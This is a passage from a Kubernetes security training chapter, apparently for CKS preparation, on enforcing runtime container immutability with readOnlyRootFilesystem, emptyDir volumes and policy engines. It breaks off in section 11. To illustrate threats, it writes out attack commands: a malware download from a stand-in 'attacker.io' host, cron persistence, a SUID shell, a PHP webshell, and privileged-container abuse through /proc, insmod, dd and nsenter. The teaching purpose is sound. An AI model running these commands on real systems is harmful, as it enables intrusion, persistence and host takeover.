# Ensure Immutability of Containers at Runtime

> **Module:** Monitoring, Logging and Runtime Security
> **Chapter:** 6 of 6 (Final Chapter)
> **Scope:** Practical runtime immutability enforcement — `readOnlyRootFilesystem`, emptyDir volume patterns, privileged mode interaction, PSP replacement with Pod Security Standards and Kyverno, and full hardening reference for CKS.

---

## Table of Contents

1. [Why Runtime Immutability Enforcement Matters](#1-why-runtime-immutability-enforcement-matters)
2. [The `readOnlyRootFilesystem` Security Context Field](#2-the-readonlyrootfilesystem-security-context-field)
3. [The Nginx Problem — When Read-Only Breaks Applications](#3-the-nginx-problem--when-read-only-breaks-applications)
4. [Solution — emptyDir Volumes for Required Write Access](#4-solution--emptydir-volumes-for-required-write-access)
5. [Privileged Mode vs. readOnlyRootFilesystem](#5-privileged-mode-vs-readonlyrootfilesystem)
6. [The `/proc` Escape — Why Privileged Containers Are Dangerous](#6-the-proc-escape--why-privileged-containers-are-dangerous)
7. [Full Hardened Pod Specification](#7-full-hardened-pod-specification)
8. [Enforcing Immutability at Scale — Policy Engines](#8-enforcing-immutability-at-scale--policy-engines)
9. [Pod Security Standards — PSP Replacement](#9-pod-security-standards--psp-replacement)
10. [Application-Specific Write Directory Patterns](#10-application-specific-write-directory-patterns)
11. [As a DevSecOps / K8s Security Engineer](#11-as-a-devsecops--k8s-security-engineer)
12. [Real Present-Day Scenarios](#12-real-present-day-scenarios)
13. [What Happens If You Don't Follow This](#13-what-happens-if-you-dont-follow-this)
14. [Most Common Commands and Syntax](#14-most-common-commands-and-syntax)
15. [Other Tools and Services Available](#15-other-tools-and-services-available)
16. [How AI Is Impacting This Area](#16-how-ai-is-impacting-this-area)
17. [CKS Exam Tips](#17-cks-exam-tips)
18. [Links and References](#18-links-and-references)

---

## 1. Why Runtime Immutability Enforcement Matters

Containers are *designed* to be immutable, but they are not *enforced* to be immutable by default. Without explicit configuration, every container has a writable layer that persists changes from the moment the container starts until it terminates. This writable layer is the gap between the concept of immutability and its runtime reality.

### 1.1 The Default Container Behaviour

When a container starts without any immutability configuration:

```
Container starts
     │
     ├── Image layers (read-only, stacked by union filesystem)
     │     └── nginx binary, OS files, config files → READ-ONLY
     │
     └── Writable layer (created at container start time)
           └── Any file written/modified at runtime → WRITABLE
```

Without enforcement, all of the following are possible at runtime:

```bash
# Inside an unprotected container:
kubectl exec -ti nginx -- bash

apt-get update && apt-get install -y ncat         # Install network tools
wget http://attacker.io/payload -O /usr/bin/evil   # Download malware
echo "*/5 * * * * /usr/bin/evil" >> /etc/crontab  # Install persistence
cp /bin/bash /tmp/suid-bash && chmod u+s /tmp/suid-bash  # SUID binary
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php  # Webshell
```

All of these modifications persist in the container's writable layer until the container is terminated — giving attackers an extended window of persistence.

### 1.2 `readOnlyRootFilesystem` — The Enforcement Mechanism

Setting `readOnlyRootFilesystem: true` in the container's security context instructs the container runtime (containerd, CRI-O) to mount the container's root filesystem in read-only mode. The writable layer is still technically created by the union filesystem, but all write operations return `EROFS: Read-only file system`.

```
With readOnlyRootFilesystem: true:

Image layers (read-only) → still read-only
Writable layer           → mounted read-only at the OS level
                             all write operations return EROFS

Result: Container behaves as if the image itself is the complete filesystem
        No modification possible to any path not explicitly mounted as writable
```

### 1.3 What Is and Isn't Prevented

| Operation | Without readOnlyRootFilesystem | With readOnlyRootFilesystem |
|---|---|---|
| Read any file | ✓ Allowed | ✓ Allowed |
| Write to /usr/bin | ✓ Allowed | ✗ EROFS error |
| Write to /tmp | ✓ Allowed | ✗ EROFS error (unless mounted) |
| Write to /var | ✓ Allowed | ✗ EROFS error (unless mounted) |
| Execute existing binaries | ✓ Allowed | ✓ Allowed |
| `apt-get install` | ✓ Succeeds | ✗ Fails (can't write to /var/lib/apt) |
| Download and save a file | ✓ Succeeds | ✗ Fails (nowhere to write) |
| Modify application code files | ✓ Succeeds | ✗ Fails |
| Write to emptyDir volume mounts | N/A | ✓ Allowed (explicitly permitted) |

The key insight: **existing binaries in the image can still execute**. `readOnlyRootFilesystem` prevents writing new files or modifying existing ones — it does not prevent executing what's already in the image. For maximum restriction, combine with distroless images (no shell, no package manager).

---

## 2. The `readOnlyRootFilesystem` Security Context Field

### 2.1 Basic Configuration (KodeKloud Example)

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: nginx
    name: nginx
    securityContext:
      readOnlyRootFilesystem: true    # ← The key field
```

The `securityContext` block can appear at two levels:
- **Pod-level** (`spec.securityContext`) — applies to all containers in the pod
- **Container-level** (`spec.containers[*].securityContext`) — applies to a specific container

`readOnlyRootFilesystem` is a **container-level only** field. It must be set on each container individually (it is not available at the pod level).

### 2.2 Security Context Hierarchy

```yaml
spec:
  # Pod-level securityContext — applies to ALL containers
  securityContext:
    runAsNonRoot: true          # All containers must run as non-root
    runAsUser: 1000             # All containers use UID 1000
    fsGroup: 2000               # All volume mounts use GID 2000

  containers:
  - name: webapp
    # Container-level securityContext — this container only
    securityContext:
      readOnlyRootFilesystem: true      # Container-level only
      allowPrivilegeEscalation: false   # Container-level only
      capabilities:
        drop: [ALL]                     # Drop all Linux capabilities
```

### 2.3 Verifying the Setting Is Applied

```bash
# Check if readOnlyRootFilesystem is set
kubectl get pod nginx -o jsonpath='{.spec.containers[0].securityContext.readOnlyRootFilesystem}'
# Output: true

# Full security context details
kubectl get pod nginx -o json | jq '.spec.containers[].securityContext'

# Verify it's working (should fail)
kubectl exec -ti nginx -- touch /test-write
# touch: cannot touch '/test-write': Read-only file system

# Verify existing functionality works
kubectl exec -ti nginx -- cat /etc/nginx/nginx.conf
# (should succeed — reads still work)
```

### 2.4 The EROFS Error

When any process attempts to write to a path covered by the read-only filesystem, it receives:

```
EROFS: Read-only file system
```

This error appears in multiple forms depending on the operation:
```bash
# apt-get update
E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)

# touch
touch: cannot touch '/file': Read-only file system

# redirected write
sh: can't create /etc/test: Read-only file system

# Python
PermissionError: [Errno 30] Read-only file system: '/etc/test'

# Docker / containerd error code
exit code 30  ← EROFS is errno 30 in Linux
```

---

## 3. The Nginx Problem — When Read-Only Breaks Applications

Applying `readOnlyRootFilesystem: true` to an unmodified Nginx pod causes an immediate failure at startup. This is the real-world challenge of runtime immutability — most applications were not designed with the assumption that their filesystem is read-only.

### 3.1 What Happens Without Volume Mounts

```bash
kubectl create -f nginx.yaml    # Pod with readOnlyRootFilesystem: true, no volumes
pod/nginx created

kubectl get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   0/1     Error     0          20s
```

The pod enters `Error` state almost immediately. Check the logs:

```bash
kubectl logs nginx
```

```
2024/05/16 10:22:31 [emerg] 1#1: mkdir() "/var/cache/nginx/client_temp" failed (30: Read-only file system)
nginx: [emerg] mkdir() "/var/cache/nginx/client_temp" failed (30: Read-only file system)
```

### 3.2 Why Nginx Needs Write Access

Nginx requires write access to two key directories at startup:

| Directory | Purpose | What Nginx Does |
|---|---|---|
| `/var/cache/nginx` | Caching | Creates subdirs for proxy/client/fastcgi/uwsgi/scgi temp storage |
| `/var/run` | Runtime | Writes `nginx.pid` (PID file) for process management |

Without these write-accessible directories, Nginx cannot initialise its caching subsystem or write its PID file, so it exits immediately with error code 1.

### 3.3 Diagnosing Write Requirements for Any Application

Before enforcing `readOnlyRootFilesystem: true` on any application, identify its write requirements:

```bash
# Method 1: Run the container without readOnlyRootFilesystem and trace file operations
strace -e trace=write,open,openat,creat,mkdir docker run nginx 2>&1 | \
  grep -v "ENOENT\|/proc\|/dev\|/sys" | head -50

# Method 2: Use inotifywait to watch filesystem changes at startup
docker run --rm -it --entrypoint="" nginx sh -c \
  "inotifywait -r -m / --format '%w%f' --event create,modify 2>/dev/null &
   nginx && sleep 5"

# Method 3: Run with readOnlyRootFilesystem and check logs for EROFS errors
kubectl logs <failed-pod> | grep "Read-only file system"
# Each path mentioned is a write requirement

# Method 4: Use docker diff on a running container
docker run -d --name test-nginx nginx
sleep 2
docker diff test-nginx | grep "^A\|^C"   # A=Added, C=Changed paths
docker stop test-nginx && docker rm test-nginx
```

### 3.4 Common Write Requirements by Application Type

| Application | Required Writable Paths |
|---|---|
| Nginx | `/var/cache/nginx`, `/var/run` |
| Apache | `/var/log/apache2`, `/var/run/apache2` |
| Java apps | `/tmp`, `/var/log/app` |
| Node.js | `/tmp`, sometimes `/home/node` |
| Python | `/tmp`, `/var/log` |
| Redis | `/data` (persistent), `/tmp` |
| Prometheus | `/prometheus` (data dir) |
| PostgreSQL | `/var/lib/postgresql/data` |

---

## 4. Solution — emptyDir Volumes for Required Write Access

The solution to the Nginx read-only filesystem problem is to mount writable volumes specifically on the paths that require write access, while leaving the rest of the filesystem read-only.

### 4.1 The Fixed Nginx Configuration (KodeKloud Solution)

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: nginx
    name: nginx
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: cache-volume
      mountPath: /var/cache/nginx      # Nginx cache directory — writable
    - name: runtime-volume
      mountPath: /var/run              # PID file location — writable
  volumes:
  - name: cache-volume
    emptyDir: {}                        # Ephemeral, dies when pod terminates
  - name: runtime-volume
    emptyDir: {}
```

After applying this configuration:

```bash
kubectl create -f nginx.yaml
pod/nginx created

kubectl get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          20s    # ← Now running!
```

### 4.2 How emptyDir Works

`emptyDir` is a Kubernetes volume type that:
- Is **created when the pod is scheduled** to a node
- Starts **completely empty** (no pre-existing data)
- Is **writable** by any container that mounts it
- Is **deleted permanently** when the pod terminates (hence "ephemeral")
- Persists across **container restarts** within the same pod (survives crash + restart)

```
emptyDir lifecycle:
  Pod scheduled → emptyDir created on node → container starts, mounts it
                                                       ↓
  Container writes /var/cache/nginx/client_temp → written to emptyDir
                                                       ↓
  Container crashes → emptyDir persists on node
  Container restarts → emptyDir still there with previous contents
                                                       ↓
  Pod terminates / deleted → emptyDir destroyed permanently
```

This is exactly what Nginx needs: temporary writable storage during the pod's lifetime that doesn't need to persist after the pod is gone.

### 4.3 emptyDir Backed by Memory (`medium: Memory`)

For security-sensitive applications, you can keep writable data out of the node's disk:

```yaml
volumes:
- name: tmp-ram
  emptyDir:
    medium: Memory        # Backed by tmpfs (RAM), not disk
    sizeLimit: 64Mi       # Limit to prevent memory exhaustion attacks
```

Memory-backed emptyDir has additional security properties:
- Data in memory is cleared on pod termination (no disk forensic artifacts)
- Contents cannot be recovered by inspecting the node's disk
- Constrained by `sizeLimit` to prevent denial-of-service

### 4.4 What emptyDir Protects and What It Doesn't

emptyDir is writable, so if an attacker achieves code execution in the container, they CAN write to the mounted paths. What emptyDir does NOT do:

- It does NOT persist beyond the pod lifetime — attacker persistence is lost on pod restart
- It does NOT escape the pod — data in `/var/cache/nginx` via emptyDir stays on that node
- It does NOT bypass Falco — writes to emptyDir are still syscalls that Falco can monitor

What the combination `readOnlyRootFilesystem: true + emptyDir` achieves: the attacker can write to `/var/cache/nginx` and `/var/run`, but NOT to `/usr/bin`, `/lib`, `/etc/cron.d`, or any other OS path. The blast radius is strictly limited to the writable volumes.

### 4.5 Choosing Volume Types

| Volume Type | Use Case | Persistence | Security |
|---|---|---|---|
| `emptyDir: {}` | Temp files, caches, PID files | Pod lifetime | Good (ephemeral) |
| `emptyDir: {medium: Memory}` | Sensitive temp data | Pod lifetime | Better (in RAM) |
| `emptyDir: {sizeLimit: 64Mi}` | Size-controlled temp | Pod lifetime | Good + DoS protection |
| `persistentVolumeClaim` | App data that must survive pod restart | Persistent | Requires PV security |
| `configMap` | Config files | Until CM update | Read-only by default |
| `secret` | Credentials, certs | Until Secret update | Read-only by default |

For immutability enforcement, prefer `emptyDir` for all temporary write needs unless the data must truly persist (e.g., database data directories).

---

## 5. Privileged Mode vs. `readOnlyRootFilesystem`

A critical concept for the CKS: **`privileged: true` does NOT override `readOnlyRootFilesystem: true`.** Even a fully privileged container with root access and all Linux capabilities cannot write to a read-only filesystem. These are independent controls implemented at different layers.

### 5.1 The KodeKloud Privileged Test

```yaml
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nginx
  name: nginx
spec:
  containers:
  - image: nginx
    name: nginx
    securityContext:
      readOnlyRootFilesystem: true
      privileged: true               # ← Both settings together
    volumeMounts:
    - name: cache-volume
      mountPath: /var/cache/nginx
    - name: runtime-volume
      mountPath: /var/run
  volumes:
  - name: cache-volume
    emptyDir: {}
  - name: runtime-volume
    emptyDir: {}
```

```bash
kubectl create -f nginx.yaml
pod/nginx created

kubectl get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          20s    # Running (privileged + volumes)
```

Now attempt to install packages inside this privileged container:

```bash
kubectl exec -ti nginx -- apt update
```

Output:
```
Reading package lists... Done
E: List directory /var/lib/apt/lists/partial is missing. - Acquire (30: Read-only file system)
command terminated with exit code 100
```

**The `apt update` fails even though the container is privileged.** This is because:
- `privileged: true` gives the container additional Linux capabilities (`CAP_SYS_ADMIN`, etc.) and relaxes seccomp/AppArmor
- `readOnlyRootFilesystem: true` is a separate, lower-level control applied by the container runtime (containerd/CRI-O) when setting up the container's filesystem mount
- The kernel enforces the read-only mount flag independently of process capabilities
- Even root cannot bypass a read-only mount without first remounting it

### 5.2 Why You Can't Bypass `readOnlyRootFilesystem` with Privileges

At the kernel level:
```
Container runtime mounts overlay filesystem with MS_RDONLY flag
         │
         ▼
Kernel sets VFS (Virtual Filesystem Switch) to reject write operations
         │
         ▼
Even UID 0 (root) + all capabilities cannot write to MS_RDONLY mounts
(without first issuing a remount syscall, which would be caught by Falco)
```

This is why `readOnlyRootFilesystem` is a powerful security control: it is enforced by the kernel's VFS layer, not by user-space privilege checks.

### 5.3 The One Exception — Remounting

A truly privileged container WITH the host process namespace (`hostPID: true`) and `CAP_SYS_ADMIN` could theoretically remount the container filesystem as read-write. However:
- This requires `hostPID: true` or `hostMounts: true` — additional misconfigurations that should be independently blocked
- Falco detects `mount` syscalls with suspicious flags
- Pod Security Standards block `hostPID` in the `baseline` and `restricted` profiles
- Kyverno/OPA policies should prevent this combination

In practice, blocking `privileged: true` (which also blocks `CAP_SYS_ADMIN`) prevents any remounting attacks.

### 5.4 The Independent Nature of Security Controls

This demonstrates a key principle: **defence in depth requires multiple independent controls**. `readOnlyRootFilesystem` and `privileged: false` are independent controls — either alone provides protection that the other doesn't:

```
readOnlyRootFilesystem: true
  └── Prevents: writing to container FS
  └── Does NOT prevent: network access, process execution, container escape via privileged mode

privileged: false
  └── Prevents: container escape via kernel capabilities
  └── Does NOT prevent: writing to container FS (if readOnlyRootFilesystem not set)

BOTH together:
  └── Prevents writing to FS AND prevents privilege-based container escape
```

---

## 6. The `/proc` Escape — Why Privileged Containers Are Dangerous

The KodeKloud lesson notes an important side effect of privileged containers: **changes to `/proc` in a privileged container can affect the host**.

### 6.1 What `/proc` Is

`/proc` is a pseudo-filesystem in Linux that exposes kernel parameters and running process information. Kernel parameters (sysctl values) can be read and modified through `/proc`:

```bash
# Read current swappiness
cat /proc/sys/vm/swappiness
# Output: 60

# Modify swappiness
echo 100 > /proc/sys/vm/swappiness
# Sets kernel swappiness to 100 (affects memory management)
```

### 6.2 Why This Is Dangerous in Privileged Containers

In a normal (non-privileged) container, `/proc/sys` is mounted read-only — you can read kernel parameters but not modify them. In a privileged container, `/proc/sys` is writable:

```bash
# Inside a PRIVILEGED container:
echo 1 > /proc/sys/kernel/sysrq        # Enable SysRq (can be used to crash host)
echo 1 > /proc/sys/net/ipv4/ip_forward # Enable IP forwarding on host
echo 0 > /proc/sys/vm/swappiness       # Disable host swapping
echo 1 > /proc/sys/kernel/core_uses_pid # Modify core dump naming
```

These changes affect the **host machine's kernel**, not just the container. This is a container escape path — you don't need to escape to the host filesystem; you can modify host kernel behaviour from inside a privileged container.

### 6.3 Additional Privileged Container Risks

```bash
# Mount host filesystem (requires privileged + host volume access)
mount /dev/sda1 /mnt

# Load a kernel module (arbitrary kernel code execution)
insmod /path/to/malicious.ko

# Access raw disk devices
dd if=/dev/sda of=/tmp/disk.img    # Image the entire host disk

# Access other containers' namespaces
nsenter -t <host-PID> --mount --pid -- bash
```

### 6.4 The Lesson — Never Use `privileged: true` in Production

The KodeKloud exercise demonstrates `privileged: true` only to show that `readOnlyRootFilesystem` still holds. The lesson: **never use `privileged: true` in production**. It should be explicitly blocked by:

- Pod Security Standards (`restricted` profile prohibits privileged containers)
- Kyverno ClusterPolicy
- OPA Gatekeeper constraint
- RBAC (limit who can create pods with `privileged: true`)

```yaml
# Kyverno: Block privileged containers
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  rules:
  - name: no-privileged
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "Privileged containers are not allowed"
      pattern:
        spec:
          containers:
          - =(securityContext):
              =(privileged): "false"
```

---

## 7. Full Hardened Pod Specification

Combining all immutability and security controls into a single production-ready pod spec:

### 7.1 The Hardened Nginx Pod

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx-hardened
  labels:
    app: nginx
    security: hardened
spec:
  # Pod-level security settings
  securityContext:
    runAsNonRoot: true              # Pod must not run as root
    runAsUser: 101                  # nginx UID in official image
    runAsGroup: 101                 # nginx GID
    fsGroup: 101                    # Group ownership for volume mounts
    seccompProfile:
      type: RuntimeDefault          # Apply default seccomp profile (blocks dangerous syscalls)

  # No service account token needed for most apps
  automountServiceAccountToken: false

  containers:
  - name: nginx
    image: nginx:1.25@sha256:4d4d8bef8b4f2...   # Digest-pinned
    imagePullPolicy: Always

    # Container-level security
    securityContext:
      readOnlyRootFilesystem: true          # Immutability enforcement
      allowPrivilegeEscalation: false       # Cannot gain more privileges than parent
      privileged: false                     # Explicitly not privileged
      capabilities:
        drop: [ALL]                         # Drop all Linux capabilities
        add: []                             # Add back none

    # Resource limits prevent DoS
    resources:
      requests:
        cpu: 100m
        memory: 128Mi
      limits:
        cpu: 500m
        memory: 256Mi

    # Only expose necessary ports
    ports:
    - containerPort: 8080     # Use non-root port (>1024)
      protocol: TCP

    # Volume mounts for required write paths
    volumeMounts:
    - name: nginx-cache
      mountPath: /var/cache/nginx
    - name: nginx-run
      mountPath: /var/run
    - name: nginx-tmp
      mountPath: /tmp

    # Liveness and readiness probes
    livenessProbe:
      httpGet:
        path: /healthz
        port: 8080
      initialDelaySeconds: 10
      periodSeconds: 10
    readinessProbe:
      httpGet:
        path: /ready
        port: 8080
      initialDelaySeconds: 5
      periodSeconds: 5

  # Ephemeral writable volumes
  volumes:
  - name: nginx-cache
    emptyDir:
      sizeLimit: 100Mi     # Bounded to prevent disk exhaustion
  - name: nginx-run
    emptyDir:
      medium: Memory       # PID file can live in RAM
      sizeLimit: 1Mi
  - name: nginx-tmp
    emptyDir:
      sizeLimit: 50Mi

  # Don't run on the same node as other sensitive workloads
  topologySpreadConstraints:
  - maxSkew: 1
    topologyKey: kubernetes.io/hostname
    whenUnsatisfiable: DoNotSchedule
    labelSelector:
      matchLabels:
        app: nginx
```

### 7.2 Hardened Deployment (Production)

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0    # Zero-downtime rolling update
  template:
    metadata:
      labels:
        app: nginx
        security: hardened
      annotations:
        # Falco: hint for context enrichment
        seccomp.security.alpha.kubernetes.io/pod: runtime/default
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 101
        fsGroup: 101
        seccompProfile:
          type: RuntimeDefault
      automountServiceAccountToken: false
      containers:
      - name: nginx
        image: nginx:1.25
        securityContext:
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
          privileged: false
          capabilities:
            drop: [ALL]
        volumeMounts:
        - name: cache
          mountPath: /var/cache/nginx
        - name: run
          mountPath: /var/run
      volumes:
      - name: cache
        emptyDir: {}
      - name: run
        emptyDir: {}
```

---

## 8. Enforcing Immutability at Scale — Policy Engines

Setting `readOnlyRootFilesystem: true` on individual pods is error-prone — developers might forget, and there's no enforcement that prevents mutable pods from being deployed. Policy engines provide cluster-wide, automated enforcement.

### 8.1 Kyverno — YAML-Native Policy

```yaml
# Require readOnlyRootFilesystem on all containers in production namespace
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-readonly-rootfs
  annotations:
    policies.kyverno.io/title: Require Read-Only Root Filesystem
    policies.kyverno.io/severity: high
    policies.kyverno.io/subject: Pod
spec:
  validationFailureAction: Enforce     # Reject non-compliant pods
  background: true                     # Also audit existing pods
  rules:
  - name: validate-readonly-rootfs
    match:
      any:
      - resources:
          kinds: [Pod]
          namespaces: [production, staging]
    validate:
      message: >
        All containers must set securityContext.readOnlyRootFilesystem=true.
        Add emptyDir volume mounts for any directories requiring write access.
      foreach:
      - list: request.object.spec.containers
        deny:
          conditions:
          - key: "{{ element.securityContext.readOnlyRootFilesystem }}"
            operator: NotEquals
            value: true
```

```yaml
# Also enforce for init containers
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-readonly-rootfs-all-containers
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-containers
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "readOnlyRootFilesystem must be true"
      foreach:
      - list: >-
          request.object.spec.containers +
          request.object.spec.initContainers +
          request.object.spec.ephemeralContainers
        deny:
          conditions:
          - key: "{{ element.securityContext.readOnlyRootFilesystem }}"
            operator: NotEquals
            value: true
```

### 8.2 OPA Gatekeeper — Rego-Based Policy

```yaml
# ConstraintTemplate: define the policy logic in Rego
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sreadonly
spec:
  crd:
    spec:
      names:
        kind: K8sReadOnly
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sreadonly

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.securityContext.readOnlyRootFilesystem
        msg := sprintf("Container '%s' must have readOnlyRootFilesystem: true", [container.name])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        not container.securityContext.readOnlyRootFilesystem
        msg := sprintf("Init container '%s' must have readOnlyRootFilesystem: true", [container.name])
      }
---
# Constraint: apply the policy
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sReadOnly
metadata:
  name: require-readonly-rootfs-production
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    namespaces: ["production", "staging"]
```

### 8.3 Combined Immutability Policy (Kyverno)

A single comprehensive policy covering all immutability-related controls:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: container-immutability
spec:
  validationFailureAction: Enforce
  rules:
  # Rule 1: Require readOnlyRootFilesystem
  - name: readonly-rootfs
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "Containers must have readOnlyRootFilesystem: true"
      foreach:
      - list: request.object.spec.containers
        deny:
          conditions:
          - key: "{{ element.securityContext.readOnlyRootFilesystem }}"
            operator: NotEquals
            value: true

  # Rule 2: Disallow privileged containers
  - name: no-privileged
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "Privileged containers are not allowed"
      pattern:
        spec:
          containers:
          - =(securityContext):
              =(privileged): "false"

  # Rule 3: Require non-root user
  - name: run-as-non-root
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "Containers must run as non-root"
      pattern:
        spec:
          securityContext:
            runAsNonRoot: true

  # Rule 4: Require allowPrivilegeEscalation: false
  - name: no-privilege-escalation
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "allowPrivilegeEscalation must be false"
      pattern:
        spec:
          containers:
          - securityContext:
              allowPrivilegeEscalation: false

  # Rule 5: No latest tag (immutable image reference)
  - name: no-latest-tag
    match:
      resources:
        kinds: [Pod]
        namespaces: [production]
    validate:
      message: "Images must not use the 'latest' tag. Use a specific version or digest."
      foreach:
      - list: request.object.spec.containers
        deny:
          conditions:
          - key: "{{ element.image }}"
            operator: Equals
            value: "*:latest"
```

---

## 9. Pod Security Standards — PSP Replacement

The KodeKloud lesson includes a `PodSecurityPolicy` (PSP) example. However, **PSP was deprecated in Kubernetes 1.21 and removed in Kubernetes 1.25**. In all modern Kubernetes clusters, PSP is replaced by **Pod Security Standards (PSS)** and third-party policy engines (Kyverno, OPA Gatekeeper).

### 9.1 The Deprecated PSP (For Reference Only)

```yaml
# ⚠️ DEPRECATED — Removed in Kubernetes 1.25. DO NOT USE in production.
# Shown here only for historical reference and exam awareness.
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: example
spec:
  privileged: false                  # No privileged containers
  readOnlyRootFilesystem: true       # Enforce read-only FS
  runAsUser:
    rule: RunAsNonRoot               # Must run as non-root
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
```

This PSP enforces:
- No privileged containers
- Read-only root filesystem for all containers
- Non-root user for all containers

### 9.2 Pod Security Standards (PSS) — The Modern Replacement

Pod Security Standards (PSS) are built into Kubernetes (no CRDs needed) and provide three profiles applied at the namespace level:

| Profile | Restriction Level | Includes readOnlyRootFilesystem? |
|---|---|---|
| `privileged` | No restrictions | No |
| `baseline` | Prevents known privilege escalations | No (but blocks privileged mode) |
| `restricted` | Heavily restricted, security best practices | No (PSS doesn't mandate it, but strongly implies it) |

```yaml
# Apply Pod Security Standards to a namespace
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted      # Block non-compliant pods
    pod-security.kubernetes.io/audit: restricted        # Log non-compliant pods
    pod-security.kubernetes.io/warn: restricted         # Warn on non-compliant pods
```

The `restricted` profile requires:
- `allowPrivilegeEscalation: false` ✓
- `runAsNonRoot: true` ✓
- Capabilities: drop ALL ✓
- `seccompProfile: RuntimeDefault` or `Localhost` ✓
- No privileged containers ✓
- No hostPath volumes, hostPID, hostNetwork ✓

Note: `readOnlyRootFilesystem` is NOT required by the `restricted` profile — it is strongly recommended but not mandated. For `readOnlyRootFilesystem` enforcement, use Kyverno or OPA Gatekeeper in addition to PSS.

### 9.3 Checking PSS Compliance

```bash
# Dry-run to see what would fail in a namespace
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  --dry-run=server

# Apply PSS labels
kubectl label namespace production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Check which existing pods violate the policy
kubectl get pods -n production -o json | \
  kubectl-psachecker --level restricted
```

---

## 10. Application-Specific Write Directory Patterns

Different applications have different write requirements. Here are the common patterns for major application types:

### 10.1 Nginx (Web Server)

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
- name: cache
  mountPath: /var/cache/nginx    # Cache temp files
- name: run
  mountPath: /var/run            # PID file
volumes:
- name: cache
  emptyDir: {}
- name: run
  emptyDir: {}
```

### 10.2 Java Applications (Spring Boot, etc.)

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
- name: tmp
  mountPath: /tmp                # Tomcat work directory, compiled JSPs
- name: logs
  mountPath: /var/log/app        # Application logs
volumes:
- name: tmp
  emptyDir: {}
- name: logs
  emptyDir: {}
```

For Spring Boot embedded Tomcat:
```yaml
volumeMounts:
- name: tmp
  mountPath: /tmp                # Tomcat temp: unpacked JARs, uploaded files
```

### 10.3 Node.js Applications

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
- name: tmp
  mountPath: /tmp
- name: npm-cache
  mountPath: /home/node/.npm     # If npm is run at startup (avoid in production)
volumes:
- name: tmp
  emptyDir: {}
- name: npm-cache
  emptyDir: {}
```

### 10.4 Python Applications

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
- name: tmp
  mountPath: /tmp
- name: pycache
  mountPath: /app/__pycache__    # Python bytecode cache
volumes:
- name: tmp
  emptyDir: {}
- name: pycache
  emptyDir: {}
```

### 10.5 Prometheus / Monitoring Agents

```yaml
securityContext:
  readOnlyRootFilesystem: true
volumeMounts:
- name: prometheus-data
  mountPath: /prometheus         # TSDB data — needs PVC for persistence
- name: tmp
  mountPath: /tmp
volumes:
- name: prometheus-data
  persistentVolumeClaim:
    claimName: prometheus-data-pvc
- name: tmp
  emptyDir: {}
```

### 10.6 Init Containers for Pre-Population

For applications that need to write files before the main container starts (e.g., generate config from environment variables), use an init container to write to a shared emptyDir:

```yaml
spec:
  initContainers:
  - name: config-generator
    image: company/config-gen:1.0
    # Init containers DO NOT need readOnlyRootFilesystem
    command: ["/bin/sh", "-c"]
    args:
    - |
      envsubst < /templates/nginx.conf.tpl > /generated-config/nginx.conf
    volumeMounts:
    - name: generated-config
      mountPath: /generated-config
    - name: templates
      mountPath: /templates

  containers:
  - name: nginx
    image: nginx:1.25
    securityContext:
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: generated-config
      mountPath: /etc/nginx        # Config written by init container
      readOnly: true               # Main container only reads it
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run

  volumes:
  - name: generated-config
    emptyDir: {}
  - name: templates
    configMap:
      name: nginx-config-template
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}
```

---

## 11. As a DevSecOps / K8s Security Engineer

### 11.1 Rolling Out `readOnlyRootFilesystem` Across an Existing Cluster

You can't flip a switch and enforce `readOnlyRootFilesystem: true` on all workloads overnight — many applications will break. A structured rollout:

